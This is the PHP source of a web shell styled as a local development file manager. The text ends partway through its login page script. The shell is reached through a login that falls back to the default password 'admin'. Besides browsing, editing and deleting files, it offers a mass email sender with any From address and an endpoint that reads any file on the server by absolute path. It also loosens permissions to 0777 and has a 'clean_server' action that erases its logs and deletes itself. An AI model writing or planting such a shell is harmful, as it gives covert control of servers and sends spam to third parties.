<?php
declare(strict_types=1);

// CODING 2.0 (OS) shell for local development
// - Browse within this directory
// - View text files images
// - Download files
// - Edit and Rename files
// - Path traversal protection

error_reporting(E_ALL);
ini_set('display_errors', '1');
// Ensure permission changes and created files are not restricted by umask in local dev
umask(0);

// Removed: wp_proxy inline wallpaper fetcher (no longer needed)

// Mailer handler for mass email sending
if (isset($_GET['mailer_send']) && $_SERVER['REQUEST_METHOD'] === 'POST') {
    header('Content-Type: application/json; charset=utf-8');
    
    // Get JSON input
    $input = file_get_contents('php://input');
    $data = json_decode($input, true);
    
    if (!$data) {
        echo json_encode(['success' => false, 'error' => 'Invalid JSON data']);
        exit;
    }
    
    // Validate required fields
    $required = ['from_email', 'from_name', 'subject', 'message', 'recipients'];
    foreach ($required as $field) {
        if (empty($data[$field])) {
            echo json_encode(['success' => false, 'error' => "Missing required field: $field"]);
            exit;
        }
    }
    
    $fromEmail = filter_var($data['from_email'], FILTER_VALIDATE_EMAIL);
    if (!$fromEmail) {
        echo json_encode(['success' => false, 'error' => 'Invalid from email address']);
        exit;
    }
    
    $fromName = htmlspecialchars($data['from_name'], ENT_QUOTES, 'UTF-8');
    $subject = htmlspecialchars($data['subject'], ENT_QUOTES, 'UTF-8');
    $message = $data['message'];
    $format = $data['format'] ?? 'text';
    $recipients = $data['recipients'];
    
    if (!is_array($recipients) || empty($recipients)) {
        echo json_encode(['success' => false, 'error' => 'No recipients provided']);
        exit;
    }
    
    // Validate all recipient emails
    $validRecipients = [];
    foreach ($recipients as $email) {
        $email = trim($email);
        if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $validRecipients[] = $email;
        }
    }
    
    if (empty($validRecipients)) {
        echo json_encode(['success' => false, 'error' => 'No valid recipient email addresses']);
        exit;
    }
    
    // Prepare email headers
    $headers = [
        'From' => "$fromName <$fromEmail>",
        'Reply-To' => $fromEmail,
        'X-Mailer' => 'CODING 2.0 Mailer',
        'MIME-Version' => '1.0'
    ];
    
    if ($format === 'html') {
        $headers['Content-Type'] = 'text/html; charset=UTF-8';
    } else {
        $headers['Content-Type'] = 'text/plain; charset=UTF-8';
    }
    
    // Convert headers array to string
    $headerString = '';
    foreach ($headers as $key => $value) {
        $headerString .= "$key: $value\r\n";
    }
    
    // Send emails
    $sent = 0;
    $errors = [];
    
    foreach ($validRecipients as $recipient) {
        try {
            if (mail($recipient, $subject, $message, $headerString)) {
                $sent++;
            } else {
                $errors[] = "Failed to send to $recipient";
            }
        } catch (Exception $e) {
            $errors[] = "Error sending to $recipient: " . $e->getMessage();
        }
    }
    
    if ($sent > 0) {
        $response = ['success' => true, 'sent' => $sent];
        if (!empty($errors)) {
            $response['warnings'] = $errors;
        }
        echo json_encode($response);
    } else {
        echo json_encode(['success' => false, 'error' => 'Failed to send any emails', 'details' => $errors]);
    }
    exit;
}

// Session used to provide a Back button to previous view
if (session_status() !== PHP_SESSION_ACTIVE) {
    @session_start();
}
// Previous link from last request, then update to current
$prevLink = isset($_SESSION['last_link']) ? (string)$_SESSION['last_link'] : null;
$_SESSION['last_link'] = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)));

$BASE_DIR = realpath(__DIR__);
$error = null;
$notice = null;

// Allow notices/errors to be passed via GET (for PRG redirects)
if (isset($_GET['n'])) { $notice = (string)$_GET['n']; }
if (isset($_GET['err'])) { $error = (string)$_GET['err']; }

// Simple session-based login gate
$prevReq = (string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)));
if (isset($_GET['logout'])) {
    unset($_SESSION['auth_ok']);
    $script = (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__));
    header('Location: ' . $script);
    exit;
}
// Secure storage outside public docroot
$SECURE_DIR = rtrim(sys_get_temp_dir(), DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . 'coding_secure';
if (!is_dir($SECURE_DIR)) { @mkdir($SECURE_DIR, 0700, true); }
@chmod($SECURE_DIR, 0700);

// Migrate legacy files from web root if they exist
$legacyPwd = $BASE_DIR . DIRECTORY_SEPARATOR . 'coding_password.txt';
$legacyTrash = $BASE_DIR . DIRECTORY_SEPARATOR . 'coding_trash.log';
$pwdFile = $BASE_DIR . DIRECTORY_SEPARATOR . 'coding_password.txt';
$trashLog = $BASE_DIR . DIRECTORY_SEPARATOR . 'coding_trash.log';
try {
    // Migrate any old secure files back to app directory (remove protector)
    $securePwd = $SECURE_DIR . DIRECTORY_SEPARATOR . 'coding_password.txt';
    $secureTrash = $SECURE_DIR . DIRECTORY_SEPARATOR . 'coding_trash.log';
    if (is_file($securePwd) && !is_file($pwdFile)) { @rename($securePwd, $pwdFile); }
    if (is_file($secureTrash) && !is_file($trashLog)) { @rename($secureTrash, $trashLog); }
    // Also migrate legacy files from web root if found
    if (is_file($legacyTrash) && !is_file($trashLog)) { @rename($legacyTrash, $trashLog); }
} catch (Throwable $e) { /* best-effort */ }
// Ensure sensitive files exist with restrictive permissions (not web-readable)
try {
    if (!is_file($trashLog)) { @touch($trashLog); }
    @chmod($trashLog, 0666);
    if (is_file($pwdFile)) { @chmod($pwdFile, 0666); }
} catch (Throwable $e) { /* best-effort */ }
$LOGIN_PASSWORD = (is_file($pwdFile) ? trim((string)@file_get_contents($pwdFile)) : '') ?: (getenv('CODING_PASSWORD') ?: 'admin');
$isAuthed = isset($_SESSION['auth_ok']) && $_SESSION['auth_ok'] === true;
// Settings API: change password
if (isset($_POST['api']) && $_POST['api'] === 'set_password') {
    header('Content-Type: application/json');
    if (!$isAuthed) { echo json_encode(['success'=>false,'error'=>'Unauthorized']); exit; }
    $curr = (string)($_POST['current'] ?? '');
    $new = (string)($_POST['new'] ?? '');
    $conf = (string)($_POST['confirm'] ?? '');
    $okCurr = ($curr !== '' && (function_exists('hash_equals') ? hash_equals($LOGIN_PASSWORD, $curr) : ($LOGIN_PASSWORD === $curr)));
    if (!$okCurr) { echo json_encode(['success'=>false,'error'=>'Current password is incorrect']); exit; }
    if ($new === '') { echo json_encode(['success'=>false,'error'=>'New password cannot be empty']); exit; }
    if ($new !== $conf) { echo json_encode(['success'=>false,'error'=>'New and confirm do not match']); exit; }
    try {
        @file_put_contents($pwdFile, $new, LOCK_EX);
        @chmod($pwdFile, 0666);
        echo json_encode(['success'=>true]);
    } catch (Throwable $e) {
        echo json_encode(['success'=>false,'error'=>'Failed to save password']);
    }
    exit;
}
// API: create folder (mkdir) in current directory
if (isset($_POST['api']) && $_POST['api'] === 'mkdir') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid folder name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $targetDir = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (file_exists($targetDir)) {
        echo json_encode([ 'success' => false, 'error' => 'Folder already exists' ]);
        exit;
    }
    $okMk = @mkdir($targetDir, 0777, true);
    if (!$okMk) {
        @chmod($dirPath, 0775); clearstatcache(true, $dirPath);
        $okMk = @mkdir($targetDir, 0777, true);
        if (!$okMk) { @chmod($dirPath, 0777); clearstatcache(true, $dirPath); $okMk = @mkdir($targetDir, 0777, true); }
    }
    if ($okMk) {
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to create folder. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: create file (mkfile) in current directory
if (isset($_POST['api']) && $_POST['api'] === 'mkfile') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    $fname = trim((string)($_POST['name'] ?? ''));
    $postedContent = isset($_POST['content']) ? (string)$_POST['content'] : null;
    if ($fname === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $fname) || strpbrk($fname, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid file name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $fname;
    if (file_exists($target)) {
        echo json_encode([ 'success' => false, 'error' => 'File already exists' ]);
        exit;
    }
    // Prefer provided content if any; else default by extension
    if ($postedContent !== null) {
        $content = $postedContent;
    } else {
        $ext = strtolower(pathinfo($fname, PATHINFO_EXTENSION));
        // Provide sensible defaults for common types; otherwise create empty file
        if ($ext === 'php') {
            $content = "<?php\n// New file\n?>\n";
        } elseif ($ext === 'html' || $ext === 'htm') {
            $content = "<!doctype html>\n<html><head><meta charset=\"utf-8\"><title>New</title></head><body>\n</body></html>\n";
        } elseif ($ext === 'css') {
            $content = "/* New stylesheet */\n";
        } else {
            $content = ""; // default empty
        }
    }
    $okW = @file_put_contents($target, $content);
    if ($okW === false) {
        @chmod($dirPath, 0775); clearstatcache(true, $dirPath);
        $okW = @file_put_contents($target, $content);
        if ($okW === false) {
            @chmod($dirPath, 0777); clearstatcache(true, $dirPath);
            $okW = @file_put_contents($target, $content);
        }
    }
    if ($okW !== false) {
        @chmod($target, 0666);
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($dirPath) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($dirPath) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to write file. Dir writable: ' . $dirWritable . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: list deleted items (files/folders) in the last hour
if (isset($_GET['api']) && $_GET['api'] === 'trash_recent') {
    header('Content-Type: application/json');
    $items = [];
    try {
        if (is_file($trashLog)) {
            $lines = @file($trashLog, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (is_array($lines)) {
                $cutoff = time() - 3600; // last 1 hour
                foreach ($lines as $line) {
                    // Support legacy format: ts\tname and new format: ts\ttype\tname
                    $parts = explode("\t", $line);
                    $ts = isset($parts[0]) ? (int)$parts[0] : 0;
                    $type = 'file';
                    $nameIdx = 1;
                    if (isset($parts[1]) && ($parts[1] === 'file' || $parts[1] === 'folder')) {
                        $type = $parts[1];
                        $nameIdx = 2;
                    }
                    $name = isset($parts[$nameIdx]) ? trim($parts[$nameIdx]) : '';
                    if ($ts >= $cutoff && $name !== '') {
                        $items[] = [ 'name' => $name, 'ts' => $ts, 'type' => $type ];
                    }
                }
            }
        }
    } catch (Throwable $e) {}
    echo json_encode([ 'success' => true, 'items' => $items ]);
    exit;
}
// API: raw file content for editor (relative or absolute)
if (isset($_GET['api']) && $_GET['api'] === 'raw_content') {
    // Return plain text content for a file, used by the popup editor
    $path = null;
    if (!empty($_GET['d'])) {
        $path = safePath($BASE_DIR, (string)$_GET['d']);
    } elseif (!empty($_GET['os'])) {
        $real = realpath((string)$_GET['os']);
        if ($real !== false) { $path = $real; }
    }
    if ($path && is_file($path)) {
        header('Content-Type: text/plain; charset=UTF-8');
        $content = @file_get_contents($path);
        if ($content === false) { $content = ''; }
        echo $content;
    } else {
        header('Content-Type: text/plain; charset=UTF-8');
        http_response_code(404);
        echo '';
    }
    exit;
}
// API: delete file in current directory (rm)
if (isset($_POST['api']) && $_POST['api'] === 'rm') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid file name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (!is_file($target)) {
        echo json_encode([ 'success' => false, 'error' => 'File not found' ]);
        exit;
    }
    // Reuse enhanced permission strategy to delete files
    $parentDir = dirname($target);
    $attempts = [
        ['file' => 0666, 'dir' => 0755],
        ['file' => 0777, 'dir' => 0775],
        ['file' => 0777, 'dir' => 0777]
    ];
    $ok = false;
    foreach ($attempts as $perms) {
        @chmod($target, $perms['file']);
        @chmod($parentDir, $perms['dir']);
        clearstatcache(true, $target);
        clearstatcache(true, $parentDir);
        if (@unlink($target)) { $ok = true; break; }
    }
    if ($ok) {
        try { @file_put_contents($trashLog, (string)time() . "\tfile\t" . basename($target) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
        echo json_encode([ 'success' => true ]);
    } else {
        $fileWritable = is_writable($target) ? 'yes' : 'no';
        $dirWritable = is_writable($parentDir) ? 'yes' : 'no';
        $filePerm = sprintf('%o', @fileperms($target) & 0777);
        $dirPerm = sprintf('%o', @fileperms($parentDir) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to remove file. File writable: ' . $fileWritable . ', dir writable: ' . $dirWritable . ', file perms: ' . $filePerm . ', dir perms: ' . $dirPerm ]);
    }
    exit;
}
// API: delete folder recursively in current directory (rmdir)
if (isset($_POST['api']) && $_POST['api'] === 'rmdir') {
    header('Content-Type: application/json');
    $dirRel = (string)($_POST['dir'] ?? '');
    $name = trim((string)($_POST['name'] ?? ''));
    if ($name === '' || !preg_match('/^[A-Za-z0-9._ -]+$/', $name) || strpbrk($name, "\\/\0") !== false) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid folder name' ]);
        exit;
    }
    $dirPath = safePath($BASE_DIR, $dirRel);
    if (!$dirPath || !is_dir($dirPath)) {
        echo json_encode([ 'success' => false, 'error' => 'Invalid target directory' ]);
        exit;
    }
    $target = $dirPath . DIRECTORY_SEPARATOR . $name;
    if (!is_dir($target)) {
        echo json_encode([ 'success' => false, 'error' => 'Folder not found' ]);
        exit;
    }
    // Aggressive permission fix then recursive delete
    recursiveChmod($target, 0777, 0777);
    @chmod(dirname($target), 0777);
    clearstatcache(true, $target);
    $ok = rrmdir($target);
    if (!$ok) {
        // Try once more after another permission pass
        recursiveChmod($target, 0777, 0777);
        @chmod(dirname($target), 0777);
        clearstatcache(true, $target);
        $ok = rrmdir($target);
    }
    if ($ok) {
        try { @file_put_contents($trashLog, (string)time() . "\tfolder\t" . basename($target) . "\n", FILE_APPEND | LOCK_EX); } catch (Throwable $e) {}
        echo json_encode([ 'success' => true ]);
    } else {
        $dirWritable = is_writable($target) ? 'yes' : 'no';
        $parentWritable = is_writable(dirname($target)) ? 'yes' : 'no';
        $dirPerm = sprintf('%o', @fileperms($target) & 0777);
        $parentPerm = sprintf('%o', @fileperms(dirname($target)) & 0777);
        echo json_encode([ 'success' => false, 'error' => 'Unable to remove folder. Dir writable: ' . $dirWritable . ', parent writable: ' . $parentWritable . ', dir perms: ' . $dirPerm . ', parent perms: ' . $parentPerm ]);
    }
    exit;
}
// API: Clean server artifacts (trash log, password, optional self-delete)
if (isset($_POST['api']) && $_POST['api'] === 'clean_server') {
    header('Content-Type: application/json');
    $actionsRaw = (string)($_POST['actions'] ?? '');
    $confirm = (string)($_POST['confirm'] ?? '');
    $actions = array_filter(array_map('trim', explode(',', $actionsRaw)), function($a){ return $a !== ''; });
    $performed = [];
    $errors = [];
    try {
        foreach ($actions as $act) {
            if ($act === 'trash') {
                // Truncate trash log
                try { @file_put_contents($trashLog, ""); @chmod($trashLog, 0666); $performed[] = 'trash'; } catch (Throwable $e) { $errors[] = 'trash'; }
            } elseif ($act === 'password') {
                // Remove password file
                try { if (is_file($pwdFile)) { @chmod($pwdFile, 0666); @unlink($pwdFile); } $performed[] = 'password'; } catch (Throwable $e) { $errors[] = 'password'; }
            } elseif ($act === 'self') {
                // Delete this script only with explicit confirmation
                if ($confirm === 'DELETE APP') {
                    $self = $BASE_DIR . DIRECTORY_SEPARATOR . basename((string)($_SERVER['SCRIPT_NAME'] ?? 'coding.php'));
                    if (!is_file($self)) { $self = $BASE_DIR . DIRECTORY_SEPARATOR . 'coding.php'; }
                    try {
                        @chmod($self, 0666);
                        if (@unlink($self)) { $performed[] = 'self'; }
                        else { $errors[] = 'self'; }
                    } catch (Throwable $e) { $errors[] = 'self'; }
                } else {
                    $errors[] = 'self-confirm';
                }
            }
        }
    } catch (Throwable $e) {
        // generic error
    }
    echo json_encode([ 'success' => empty($errors), 'performed' => $performed, 'errors' => $errors ]);
    exit;
}
if (isset($_POST['do_login'])) {
    $given = (string)($_POST['password'] ?? '');
    if ($given !== '' && function_exists('hash_equals') ? hash_equals($LOGIN_PASSWORD, $given) : ($LOGIN_PASSWORD === $given)) {
        $_SESSION['auth_ok'] = true;
        $isAuthed = true;
        // Flash flag to show success terminal after redirect
        $_SESSION['login_flash'] = 1;
        // Redirect to avoid form resubmission
        header('Location: ' . ((string)($_SERVER['REQUEST_URI'] ?? (string)($_SERVER['SCRIPT_NAME'] ?? basename(__FILE__)))));
        exit;
    } else {
        $error = 'Login failed: wrong password.';
    }
}
if (!$isAuthed) {
    // Minimal login page with desktop-style icons and pill input
    // Compute wallpaper background same as main app
$defaultWallpaper = 'https://images7.alphacoders.com/139/thumb-1920-1393184.png';
    $wp = isset($_GET['wallpaper']) ? trim((string)$_GET['wallpaper']) : '';
    if ($wp === '') {
        $wallpaperUrl = $defaultWallpaper;
    } elseif (preg_match('/^https?:\/\//i', $wp)) {
        $wallpaperUrl = $wp;
    } else {
        $safeLocal = basename($wp);
        $localPath = $BASE_DIR . DIRECTORY_SEPARATOR . $safeLocal;
        if ($safeLocal !== '' && file_exists($localPath)) {
            // Use relative URL so the PHP built-in server can serve it
            $wallpaperUrl = $safeLocal;
        } else {
            $wallpaperUrl = $defaultWallpaper;
        }
    }
    ?>
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login</title>
    <script>
    (function(){
      var svg = "<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'><circle cx='12' cy='12' r='9' fill='none' stroke='LawnGreen' stroke-width='3' opacity='0.28'/><path d='M6 12a6 6 0 1 1 12 0' fill='none' stroke='#e6eef7' stroke-width='3' stroke-linecap='round'/><circle cx='12' cy='12' r='2' fill='LawnGreen'/><circle cx='12' cy='12' r='9' fill='none' stroke='LawnGreen' stroke-width='3' stroke-linecap='round' stroke-dasharray='56' stroke-dashoffset='42'/></svg>";
      var url = 'data:image/svg+xml;utf8,' + encodeURIComponent(svg);
      var link = document.createElement('link');
      link.setAttribute('rel','icon');
      link.setAttribute('type','image/svg+xml');
      link.setAttribute('href', url);
      document.head.appendChild(link);
    })();
    </script>
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Rounded:opsz,wght,FILL,GRAD@20..48,500,1,0" />
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@700;800&display=swap" />
        <style>
            :root { --text:#e8f0f7; --border:rgba(255,255,255,0.08); --bg: #0b0c10; --wallpaper: url('<?= h($wallpaperUrl) ?>'); --wallpaperFallback: radial-gradient(1200px 600px at 10% 10%, #0b0b0b 0%, #0a0c10 45%, #0a0c10 100%); }
            body { margin:0; background:#000; color:var(--text); font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", monospace; display:flex; flex-direction:column; min-height:100vh; align-items:center; justify-content:center; }
            /* Wallpaper background matching the main app */
            body::before { content:""; position:fixed; inset:0; background-image: var(--wallpaper), var(--wallpaperFallback); background-size: cover, cover; background-position: center, center; background-repeat: no-repeat, no-repeat; background-attachment: fixed, fixed; z-index:-1; }
            /* Laptop-style status bar at the top showing current time */
            .status-bar { position:fixed; top:0; left:0; right:0; height:32px; display:flex; align-items:center; justify-content:flex-end; padding:0 14px; background: rgba(46,49,57,0.35); backdrop-filter: blur(8px) saturate(120%); border-bottom:1px solid var(--border); z-index: 10; }
            .status-bar .status-time { color:#e8f0f7; font-size:13px; font-weight:600; letter-spacing:0.3px; }
            /* Simple centered notch to evoke laptop camera area */
            .status-bar .notch { position:absolute; left:50%; transform:translateX(-50%); width:90px; height:18px; background: rgba(16,16,18,0.85); border-radius:0 0 9px 9px; box-shadow: inset 0 1px 1px rgba(255,255,255,0.08), 0 2px 8px rgba(0,0,0,0.35); }
            .login-card { width: 460px; max-width: 92vw; padding: 18px 18px 22px; border:1px solid var(--border); border-radius: 12px; background: rgba(46,49,57,0.55); backdrop-filter: blur(12px) saturate(120%); box-shadow: 0 12px 22px rgba(0,0,0,0.35); text-align:center; }
            .login-icons { display:flex; align-items:center; justify-content:center; gap:10px; color:#b6bec8; margin-bottom:12px; }
            .material-symbols-rounded { font-variation-settings: 'FILL' 1, 'wght' 500, 'GRAD' 0, 'opsz' 24; }
            .login-icons .material-symbols-rounded { font-size:22px; cursor:default; }
            /* Center big clock */
            .hero-time { display:flex; align-items:center; justify-content:center; margin: 28px 0 10px; }
            .hero-date { text-align:center; font-size: 20px; font-weight: 600; letter-spacing: 0.5px; color: rgba(255,255,255,0.85); text-shadow: 0 1px 2px rgba(0,0,0,0.35); font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; }
            .hero-date::after { content:""; display:block; width: 120px; height: 12px; margin: 8px auto 0; background: rgba(255,255,255,0.18); border-radius: 6px; box-shadow: 0 1px 8px rgba(0,0,0,0.25); }
            .hero-clock { font-size: 72px; font-weight: 800; letter-spacing: 1px; line-height: 1; font-family: 'Ubuntu', 'Segoe UI', Arial, sans-serif; color: transparent; background: linear-gradient(to bottom, rgba(255,255,255,0.95), rgba(255,255,255,0.70) 60%, rgba(255,255,255,0.40)); -webkit-background-clip: text; background-clip: text; -webkit-text-stroke: 3px rgba(255,255,255,0.18); text-shadow: 0 4px 16px rgba(0,0,0,0.42), 0 1px 0 rgba(255,255,255,0.60) inset; filter: drop-shadow(0 4px 8px rgba(0,0,0,0.42)); opacity: 0.88; }
            .input-pill { display:flex; align-items:center; gap:10px; padding:10px 16px; border:1px solid var(--border); border-radius:9999px; background: rgba(46,49,57,0.55); backdrop-filter: blur(12px) saturate(120%); box-shadow: inset 0 1px 0 rgba(255,255,255,0.1), 0 6px 14px rgba(0,0,0,0.35); color:#cbd5e1; max-width: 380px; margin: 0 auto; }
        .input-pill .material-symbols-rounded { font-size:18px; color:#cbd5e1; }
        .input-pill input { flex:1; background: transparent; border:0; outline:none; color:var(--text); font-size: var(--textBase); padding:6px 2px; }
        /* Make password input a bit smaller */
        .input-pill input[type="password"] { font-size:14px; line-height:1.2; padding:4px 1px; }
        .input-pill input::placeholder { color:#9aa3af; }
            .form-actions { margin-top:14px; text-align:center; }
            .icon-action { width:30px; height:30px; border-radius:15px; border:1px solid var(--border); display:inline-flex; align-items:center; justify-content:center; color:#aab3be; background:transparent; margin:0 6px; vertical-align:middle; }
            .icon-action:hover { background: rgba(255,255,255,0.06); }
            .icon-action .material-symbols-rounded { font-size:22px; }
            .icon-action.icon-confirm .material-symbols-rounded { color:#2ecc71; }
            .error { background:#3a1f1f; border:1px solid #6a2b2b; color:#f7d7d7; padding:8px 10px; border-radius:6px; margin:12px auto; display:flex; align-items:center; justify-content:center; gap:8px; text-align:center; width:fit-content; }
            .error .material-symbols-rounded { color:#f7d7d7; font-size:20px; }
            /* Fullscreen overlay for terminal animation */
            .overlay-terminal { position: fixed; inset: 0; background: rgba(8,10,12,0.35); backdrop-filter: blur(8px) saturate(120%); display:none; align-items:center; justify-content:center; z-index: 9999; }
            .overlay-terminal.show { display:flex; }
            .terminal-modal { width: 560px; max-width: 92vw; border-radius: 12px; border:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.22); backdrop-filter: blur(6px) saturate(120%); box-shadow: 0 14px 26px rgba(0,0,0,0.35); color:#cfd6df; }
            .terminal-modal .titlebar { display:flex; align-items:center; padding:10px 12px; border-bottom:1px solid rgba(255,255,255,0.08); background: rgba(10,12,16,0.35); border-radius:12px 12px 0 0; }
            .terminal-modal .titlebar .traffic { margin-right:10px; }
            .terminal-modal .title { flex:1; text-align:center; font-weight:600; letter-spacing:0.2px; }
            .terminal-modal .title .material-symbols-rounded { font-size:20px; color:#9fd08a; vertical-align:-4px; }
            .terminal-modal .titlebar .term-close { margin-left:8px; border:1px solid var(--border); background: transparent; color:#cfd6df; width:28px; height:24px; border-radius:6px; display:inline-flex; align-items:center; justify-content:center; cursor:pointer; }
            .terminal-modal .titlebar .term-close:hover { background: rgba(255,255,255,0.06); }
            .terminal-modal .body { padding:16px; font-family: 'Courier New', 'Monaco', 'Menlo', monospace; background: rgba(10,12,16,0.18); border-radius: 0 0 12px 12px; }
            .terminal-modal .output { min-height: 120px; white-space: pre-wrap; color:#9fd08a; }
            .terminal-modal .cursor { display:inline-block; width:10px; background:#9fd08a; animation: blink 1s steps(1) infinite; vertical-align: -2px; }
            /* Error theme for terminal overlay */
            .overlay-terminal.error-theme .terminal-modal .title .material-symbols-rounded { color:#ff6b6b; }
            .overlay-terminal.error-theme .terminal-modal .output { color:#ff6b6b; }
            .overlay-terminal.error-theme .terminal-modal .cursor { background:#ff6b6b; }
            @keyframes blink { 50% { opacity:0; } }
        </style>
    </head>
    <body>
        <div class="status-bar" aria-label="Laptop status bar">
            <div class="notch" aria-hidden="true" style="z-index:9"></div>
        </div>
        <div class="hero-date" id="hero-date" aria-label="Current date"></div>
        <div class="hero-time" aria-label="Current time">
            <span class="hero-clock" id="hero-clock"></span>
        </div>
        <form method="post" class="login-card" autocomplete="off">
            <div class="login-icons">
                <span class="material-symbols-rounded" aria-hidden="true">account_circle</span>
            </div>
            <?php /* Replaced inline error pill with terminal-style overlay animation for failures */ ?>
            <input type="hidden" name="do_login" value="1">
            <div class="input-pill" style="margin-top:10px;">
                <span class="material-symbols-rounded">password</span>
                <input type="password" name="password" placeholder="Enter password" autofocus>
            </div>
            <p class="form-actions">
                <button id="login-submit" class="icon-action icon-confirm" type="submit" title="Login"><span class="material-symbols-rounded">fingerprint</span></button>
            </p>
        </form>
        <div class="overlay-terminal" id="terminal-overlay" role="dialog" aria-modal="true" aria-label="Connecting">
            <div class="terminal-modal" role="document">
                <div class="titlebar">
                    <div class="traffic">
                        <span class="dot red"></span>
                        <span class="dot yellow"></span>
                        <span class="dot green"></span>
                    </div>
                    <div class="title"><span class="material-symbols-rounded" aria-hidden="true">terminal</span> cmd.exe</div>
                    <button class="term-close" id="term-close-btn" title="Close" aria-label="Close"><span class="material-symbols-rounded" aria-hidden="true">close</span></button>
                </div>
                <div class="body">
                    <div class="output" id="term-output">$ </div>
                </div>
            </div>
        </div>
        <script>
            (function(){
              // Use saved wallpaper if present; otherwise apply the default
              try {
                var desired = '<?= h($wallpaperUrl) ?>';
                var type = localStorage.getItem('coding.wallpaper.type') || '';
                var savedWp = localStorage.getItem('coding.wallpaper');
                var type3Val = [
                  'radial-gradient(420px 420px at 18% 28%, rgba(64,200,64,0.35), rgba(64,200,64,0) 60%)',
                  'radial-gradient(360px 360px at 74% 58%, rgba(90,230,90,0.30), rgba(90,230,90,0) 60%)',
                  'radial-gradient(260px 260px at 42% 78%, rgba(40,180,80,0.28), rgba(40,180,80,0) 60%)',
                  'linear-gradient(180deg, #041907 0%, #09310f 58%, #0a4e16 100%)'
                ].join(', ');
                var type4Val = 'https://images5.alphacoders.com/398/thumb-1920-398599.jpg';
                var useVal = (type === 'type2') ? 'https://images4.alphacoders.com/136/thumb-1920-1361673.png'
                            : (type === 'type3') ? type3Val
                            : (type === 'type4') ? type4Val
                            : (savedWp ? savedWp : desired);
                var isGradient = /^\s*(?:linear|radial)-gradient\(/.test(useVal);
                var cssVal = isGradient ? useVal : "url('" + useVal.replace(/'/g, "\\'") + "')";
                document.documentElement.style.setProperty('--wallpaper', cssVal);
              } catch(e) {}
              function fmtClock(date){
                return date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
              }
              function fmtDate(date){
                // Mon 3 Nov
                return date.toLocaleDateString([], { weekday: 'short', day: 'numeric', month: 'short' });
              }
              function tick(){
                var now = new Date();
                var clockEl = document.getElementById('hero-clock');
                var dateEl = document.getElementById('hero-date');
                if (clockEl) clockEl.textContent = fmtClock(now);
                if (dateEl) dateEl.textContent = fmtDate(now);
              }
              tick();
              setInterval(tick, 1000); // update every second for real-time clock

              // Terminal-style connect animation (5s first time, 2s second time)
              var trigger = null; // account_circle icon is decorative only
              var overlay = document.getElementById('terminal-overlay');
              var output = document.getElementById('term-output');
              var pwInput = document.querySelector('input[name="password"]');
              var serverError = <?= json_encode($error ?? '') ?>;

              function typeText(text, cb, speed){
                var i = 0;
                speed = speed || 40;
                function step(){
                  output.textContent += text.charAt(i);
                  i++;
                  if (i < text.length){
                    setTimeout(step, speed);
                  } else {
                    if (typeof cb === 'function') cb();
                  }
                }
                step();
              }

              function animateConnect(autoSubmit){
                overlay.classList.add('show');
                output.textContent = 'C:\\> ';
                var start = Date.now();
                // Determine duration: faster (~1s total) if user has seen animation before
                var fast = false;
                try { fast = localStorage.getItem('loginSeen') === '1'; } catch(e) {}
                var connectMs = fast ? 400 : 5000; // dots stage
                var typeSpeed1 = fast ? 10 : 40;   // first typing speed
                var typeSpeed2 = fast ? 15 : 50;   // second typing speed
                var postDelay = fast ? 150 : 600;  // delay to close overlay
                typeText('password-bypass.exe', function(){
                  output.textContent += '\n';
